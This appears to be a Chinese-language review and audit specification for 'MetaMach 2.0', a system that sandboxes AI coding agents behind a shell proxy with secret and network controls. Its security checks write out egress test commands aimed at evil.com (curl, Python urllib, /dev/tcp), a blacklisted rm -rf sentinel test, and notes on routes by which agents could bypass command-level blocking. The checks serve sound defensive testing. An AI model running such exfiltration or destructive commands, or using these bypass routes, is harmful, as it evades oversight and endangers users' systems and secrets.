
### ── 围绕设计哲学、极致安全性、系统稳定性与多维灾备的核心架构走查与审计标准

> ⚠️ **安全审查红线**：本规范中所有安全审查项（尤其 REV-SEC-* 系列）**必须在隔离的容器或专用测试 VM 中执行，严禁在生产机或含个人数据的宿主机上运行**。所有“破坏性指令”测试一律使用 `/tmp/metamach-review-*` 哨兵目录等安全等价物，绝不执行真实系统级删除。

## 1. 宏观审查目标与设计哲学对账 (Philosophy Alignment)

在 MetaMach 2.0 正式合闸并网前，必须由架构师与厂长共同对系统进行**架构级审查（Design Review）**。本规范书提供了一套硬核、量化的审计标准，用以证明系统设计在面对恶劣物理环境和黑盒 AI 漏洞时，依然能 100% 捍卫以下四大设计支柱：

```
+-----------------------------------------------------------------------------------------+
|                                🪐 METAMACH 2.0 REVIEW PILLARS                           |
+-----------------------------------------------------------------------------------------+
|  1. 🛡️ 安全合规审查 (Security)  -->  验证物理级 janus-sh 拦截与 /dev/shm 内存盘密钥保护   |
|  2. ⏳ 物理稳定性审查 (Stability) -->  验证 remain-on-exit 进程守护与 16KB 爆库防御      |
|  3. 🌀 故障自愈审查 (Disaster)   -->  验证多租户隔离、零状态冷启动与 Fallback 缓存        |
|  4. 📈 硅基进化审计 (Evolution)  -->  验证 Offboard 熔炼质检报告与 OpenWiki 遗传学        |
+-----------------------------------------------------------------------------------------+
```

## 2. 核心审查域详细规格 (Review Domains)

### 🛡️ 审查域一：极客车间安全性 (Security Invariants Review)

本审查旨在证明：**AI 无论如何发生幻觉或恶意越权，也绝对无法穿透沙箱窃取物理凭证，且高危指令无法到达真实系统 Shell。**

- **指标 1.1：`/dev/shm` 内存盘物理隔离审计**
    
    - _审查要求_：验证敏感密钥（如 Questrade API 凭证、SSH 密钥等）在落盘、读取、销毁三个阶段的物理安全性。
        
    - _通过标准_：
        
        1. 宿主机磁盘上严禁存在任何明文解密后的 `.decrypted` 文件。
            
        2. `decrypt_secrets.sh` 挂载路径必须限定在内存文件系统 `/dev/shm/`（内存盘）中。
            
        3. 使用 `ls -l` 审计该文件权限，必须为 `0600`（仅 `janus-daemon` 运行用户可读写），严禁向 `others` 开放。
            
        4. `janus-daemon` 进程终止或任务结束后，系统必须原子化执行 `shm_unlink` 或直接清空该内存块。
            
- **指标 1.2：`janus-sh` 代理拦截与 `Tool Guard` 对账审计**
    
    - _审查要求_：证明不依赖大模型的自我克制，拦截是在真实的物理 Shell 之前同步发生的。
        
    - _通过标准_：
        
        1. 检查 Tether 启动的每一个 PTY 窗格，其 `SHELL` 环境变量必须强制指向 `/target/release/janus-sh`。
            
        2. 审计 `janus-sh` 与 `janus.sock` 之间的 UDS 同步阻塞调用机制。发送拦截命令时，`janus-sh` 必须保持 Blocked 挂起状态，绝不提前 fork 子进程。
            
        3. 审计 Tool Guard 决策矩阵：高危命令（如未授权的网络外联、物理擦除 flash、非 Dry-run 交易发单等）在未检测到 Teams/TUI 端核准的 **Correlation ID 数字签名**前，必须 100% 触发重写重定向或直接报错阻断。
            

- **指标 1.3：UDS 信道完整性审计**

    - _审查要求_：证明 `janus.sock` 信道本身不可被本地恶意进程冒充或窃听。

    - _通过标准_：

        1. `janus.sock` 文件权限必须为 `0600`（仅属主可读写），属主为 `janus-daemon` 运行用户。
            
        2. Daemon 处理每条 UDS 请求前，必须校验对端 PID/UID（`getpeercred`/`SO_PEERCRED`），拒绝非授权来源。
            
        3. 以另一用户身份连接 `janus.sock` 必须被拒绝；伪造 `janus-sh` 发送恶意 `ALLOW` 响应的攻击面须被消除（响应仅由 Daemon 发出）。
            
- **指标 1.4：崩溃后密钥卫生审计**

    - _审查要求_：验证 Daemon 被 `SIGKILL`（无法运行清理钩子）或主机重启后，`/dev/shm` 解密密钥不残留。

    - _通过标准_：

        1. 载入密钥后 `kill -9 janus-daemon`，审计 `/dev/shm/metamach.janus/*.decrypted`：或被清理，或明确文档化“残留至重启”并配置 `systemd-tmpfiles` 清理规则。
            
        2. 主机重启后 `/dev/shm` 必须为空（tmpfs 易失性核实，不可假设）。
            
        3. 审计是否存在 swap 残留风险；若 `allow_swap` 不可控，须文档化并建议 `swapoff` 或 `mlock`。
            
- **指标 1.5：网络外联控制审计**

    - _审查要求_：证明 `allow_network = false` 的 Agent（如 Scout）无法经任何途径外联。

    - _通过标准_：

        1. Scout 级 Agent 执行 `curl http://evil.com` 必须被阻断。
            
        2. 经替代途径 `python3 -c "import urllib.request; urllib.request.urlopen('http://evil.com')"` 或 Bash `/dev/tcp` 也必须被阻断。
            
        3. 文档化网络控制的层级：仅命令白名单级，还是 OS 级（`iptables`/`nftables`/`pfctl`）；若仅命令级，须记录已知绕过风险。
            

### ⏳ 审查域二：物理系统稳定性 (Stability & Budget Review)

本审查旨在证明：**当面临 Agent 日志死循环刷屏、数据库连接池断开等极端高频负载时，系统不会发生级联物理崩溃。**

- **指标 2.1：PTY 进程防死锁与 `remain-on-exit` 审查**
    
    - _审查要求_：证明任务中断、报错或网络掉线时，现场绝对保留，不杀进程。
        
    - _通过标准_：
        
        1. 审查 `configs/tmux.conf` 和 `herdr-tether` 调用的初始化入参，必须使用**独立 tmux server**（`tmux -L metamach-tether`）并 per-session 设置 `remain-on-exit on`（不得用 `-g` 全局开关污染厂长本机 tmux）。
            
        2. 人为向 Agent 窗格发送 `kill -9 <agent_process>`，该 tmux 窗口必须保持 `[Exited]` 挂起状态，窗口不自动关闭，控制台历史缓存（Stdout）完全可被 `herdr-tether attach` 检索还原。
            
- **指标 2.2：16 KiB 存储体积预算（Size Budget）防爆审计**
    
    - _审查要求_：验证系统是否能在入库前强力切断死循环刷屏日志，保护 Postgres。
        
    - _通过标准_：
        
        1. 当 Stdout 流式写入缓存时，`janus-sh` 或 `janus-daemon` 的缓冲池必须限制在 **16 KiB (16384 Bytes)** 限制内。
            
        2. 输入超出预算的文本，落盘至 `absurd_steps.result_cache` 的 JSON 字段大小必须严格等于 16KB，且超出部分被物理裁剪（Truncated），并在尾部原子注入 `[MetaMach Log Budget Exceeded]` 标志。
            

- **指标 2.3：工作流进度可视性审计**

    - _审查要求_：证明厂长对在途工作流具备实时、可信的可视性，能区分“正常运行”与“卡死”，且查询不干扰执行通道。

    - _通过标准_：

        1. Popup 进度视图打开期间，工位状态（`PENDING -> RUNNING -> COMPLETED`）相对真实执行的延迟必须 ≤ 2s。
            
        2. 任意工位进入 `SUSPENDED` 后，进度大盘必须在 1s 内高亮该行并渲染 `[Attach]` / `[Resume]` 入口。
            
        3. `progress` 查询必须走只读旁路事务：在重型编译（写事务密集）期间打开大盘，不得造成工作流卡顿或 UDS 阻塞。
            
        4. 无 TUI 环境下 `janus status` 输出必须与同时刻大盘数据一致（同源 `progress` 原语）。
            

- **指标 2.4：负载与资源压力审计**

    - _审查要求_：证明高并发派单与长时运行下系统不发生死锁或资源泄漏。

    - _通过标准_：

        1. 同时派发 5 条 `dev-flow` 流水线，全部须正常完成、无死锁、无跨蓝图 `result_cache` 串扰。
            
        2. 连续运行 24 小时后，`janus-daemon` 内存占用须稳定在 256MB 以下（无单调增长泄漏）。
            
        3. UDS 命令裁决往返时延（`janus-sh` -> Daemon -> 响应）在并发压力下 p99 须 < 10ms。
            

### 🌀 审查域三：高可用与灾备恢复 (Disaster Recovery Review)

本审查旨在证明：**在 Richmond Hill 车间突发停电、物理硬件重启等灾难场景下，系统具备完全无损的状态重建与自愈能力。**

- **指标 3.1：冷启动零状态自愈（Reconciliation）审查**
    
    - _审查要求_：证明系统不依赖脆弱的 `tmux-resurrect`，完全通过数据库事务在物理断点处重跑接棒。
        
    - _通过标准_：
        
        1. 禁止在 tmux 中配置任何 `tmux-resurrect` 插件。
            
        2. 模拟主机断电重启：杀掉所有 `tmux`、`janus-daemon` 进程。
            
        3. 重新拉起 Daemon 后，触发自愈对账：Daemon 必须成功从 `absurd_steps` 物理表中检索到最后一个处于 `COMPLETED` 状态的 Step。
            
        4. 系统必须能够利用该 Step 的 `result_cache` 缓存，自动申请全新的 Tether Session UUID 并在后台平滑重跑，整个过程对于前台交互端无感。
            
- **指标 3.2：数据库宕机 Fallback 机制审计**
    
    - _审查要求_：验证当 Unified PG 数据库容器闪退时，车间生产不中断。
        
    - _通过标准_：
        
        1. 手动关闭 Postgres 容器，在 `janus-daemon` 运行期间模拟数据库断开。
            
        2. 此时新启动的 Step 状态和过渡态必须无缝切换写入本地临时的 **`HERDR_PLUGIN_STATE_DIR/fallback.db`**（本地 SQLite 环形备份队列）。
            
        3. 重新拉起 PG 容器后，Daemon 必须触发同步重放（Log Replay），将本地 `fallback.db` 中的记录增量合并至主库，未发生任何状态丢失。
            

### 📈 审查域四：生命周期熔炼与自我进化 (Melt & Evolution Review)

本审查旨在证明：**产品下线（Offboard）后，数据库无体积膨胀，且积累的调试经验可以 100% 遗传给下一代 Agent。**

- **指标 4.1：逻辑多租户多维度清理审计**
    
    - _审查要求_：验证执行 `melt_blueprint_data('<name>')` 存储过程后，数据库占用的 TOAST 物理表空间被彻底释放。
        
    - _通过标准_：
        
        1. 在 Offboard 前记录 PG 中 `absurd_steps` 表的物理磁盘占用大小。
            
        2. 执行 `janus offboard --blueprint <name>`。
            
        3. 执行后，该 Blueprint 对应的所有 `result_cache` JSON 大字段物理值必须为 `NULL`（基础审计字段除外）。
            
        4. 调用 `VACUUM FULL absurd_steps`，磁盘物理占用必须出现断崖式收缩，证明空间成功回收。
            
- **指标 4.2：硅基知识遗传（Few-shot 避坑）审计**
    
    - _审查要求_：验证生成的 `production_report.md` 是否具备真正的少样本（Few-shot）自愈与抗体遗传能力。
        
    - _通过标准_：
        
        1. 在 `production_report.md` 中，必须结构化包含上一代开发时的：**【编译报错历史】**、**【引脚冲突细节】**、**【Tool Guard 同步拦截日志】** 以及 **【成功通过的 Patch】**。
            
        2. 重新 Onboard 该项目时，OpenWiki 必须优先索引并合并该质检白皮书。
            
        3. 新一任 Agent 进场扫描该脑图后，其 System Prompt 必须成功携带该免疫信息，并在后续代码生成中主动规避引脚冲突，编译一次性通过。
            
- **指标 4.3：蓝图上线与租户注册审计**

    - _审查要求_：证明 `janus onboard` 能将一个蓝图目录安全、幂等地转化为 `ACTIVE` 可派发产品线，并正确回收历史经验。

    - _通过标准_：
        
        1. 执行 `janus onboard --blueprint <name>` 后，`blueprints` 表必须出现且仅出现一行该蓝图的 `ACTIVE` 记录，且 Popup 派单菜单即时可见。
            
        2. 连续重复执行 Onboard 不得产生重复行（`ON CONFLICT` 幂等），亦不得破坏既有 Task/Step 数据。
            
        3. 对一个已 `OFFBOARDED` 的蓝图重新 Onboard，其状态必须回到 `ACTIVE`，且若存在上一代 `production_report.md`，该白皮书的关键失败模式必须以 `## Previous Incidents` 少样本形式出现在新一代 Agent 的 System Prompt 中（可经 Daemon 调试端点核验）。
            

## 3. 软件审查评审表 (Review Sign-Off Sheet)

厂长与架构师在对账时，必须针对以下表格中的每一项进行物理核对与签字确认：

|**审查编号**|**审计项 (Audit Item)**|**验证手段**|**物理状态确认 (Sign-off)**|**风险判定**|
|---|---|---|---|---|
|**REV-SEC-01**|**`/dev/shm` 权限隔离**|在宿主机上运行 `stat /dev/shm/*.decrypted`，核对权限是否为 `0600` 且属主为守护进程用户。|`[ ]` 已核对 / 物理隔离正常|**极高 (Red)**|
|**REV-SEC-02**|**`janus-sh` 越权阻断**|创建哨兵目录 `mkdir -p /tmp/metamach-review-$(uuidgen) && echo s > /tmp/metamach-review-$(uuidgen)/sentinel`，再经 Agent 窗格强制执行命中黑名单的 `rm -rf /tmp/metamach-review-*`，验证 `janus-daemon` UDS 是否同步拦截并锁定挂起，且哨兵文件事后仍然存在。|`[ ]` 已核对 / 拦截阻断通过|**极高 (Red)**|
|**REV-STB-01**|**16KB Size Budget**|运行 `cat /dev/urandom` 刷屏，验证写入 Postgres 的 JSON 是否被强制截断且附带 Budget 标记。|`[ ]` 已核对 / 存储降解正常|**中 (Yellow)**|
|**REV-DIS-01**|**冷启动零状态自愈**|`killall -9 janus-daemon` 并仅杀 MetaMach 所属 tmux 会话（`for s in $(tmux list-sessions -F '#{session_name}' | grep '^tether-janus-'); do tmux kill-session -t "$s"; done`），DB 用 `docker compose stop` 模拟机房断电；验证重新拉起后是否根据 PG Step 断点平滑接棒。|`[ ]` 已核对 / 自愈接力成功|**高 (Orange)**|
|**REV-EVO-01**|**下线降解与经验遗传**|执行 `janus offboard`，验证数据库大 JSON 擦除率达 100%，且本地成功生成 `production_report.md`。|`[ ]` 已核对 / 经验遗传闭环|**中 (Yellow)**|
|**REV-OPS-01**|**工作流进度可视性**|派发多工位流水线，打开进度大盘，验证工位状态 ≤2s 刷新、`SUSPENDED` ≤1s 高亮，且 `janus status` 与大盘同源一致。|`[ ]` 已核对 / 进度可视正常|**高 (Orange)**|
|**REV-EVO-02**|**蓝图上线与租户注册**|执行 `janus onboard`，验证 `blueprints` 表出现唯一 `ACTIVE` 行、幂等无重复，且重新 Onboard 回收 `production_report.md` 进 System Prompt。|`[ ]` 已核对 / 上线注册闭环|**高 (Orange)**|
|**REV-SEC-03**|**UDS 信道完整性**|`stat janus.sock` 核对权限 `0600`；以另一用户连接须被拒；核对 Daemon 校验对端 PID/UID。|`[ ]` 已核对 / 信道完整|**高 (Orange)**|
|**REV-SEC-04**|**崩溃后密钥卫生**|载入密钥后 `kill -9 janus-daemon`，审计 `/dev/shm/*.decrypted` 清理或 tmpfiles 规则；重启后 `/dev/shm` 为空。|`[ ]` 已核对 / 密钥卫生|**高 (Orange)**|
|**REV-SEC-05**|**网络外联控制**|Scout 级 Agent 执行 `curl`/`python3 urllib`/`/dev/tcp` 外联均被阻断；文档化控制层级。|`[ ]` 已核对 / 外联受控|**中 (Yellow)**|
|**REV-STB-03**|**负载与资源压力**|5 并发 `dev-flow` 无死锁完成；24h 运行 Daemon 内存 <256MB；UDS 裁决 p99 <10ms。|`[ ]` 已核对 / 压力稳定|**中 (Yellow)**|

## 4. 架构师与厂长联签合闸 (UAT Final Approval)

本规范书经由 **MetaMach 2.0 架构师** 与 **新任厂长（End User）** 物理核对无误后，共同在下方签字。

一旦联签完成，意味着 Richmond Hill 车间的分布式硅基巨轮正式点火，并网通电！

- **架构师（系统稳定性与安全背书）：** ______________________ 日期：2026年07月15日
    
- **新任厂长（生产业务与合闸审批核准）：** ______________________ 日期：2026年07月15日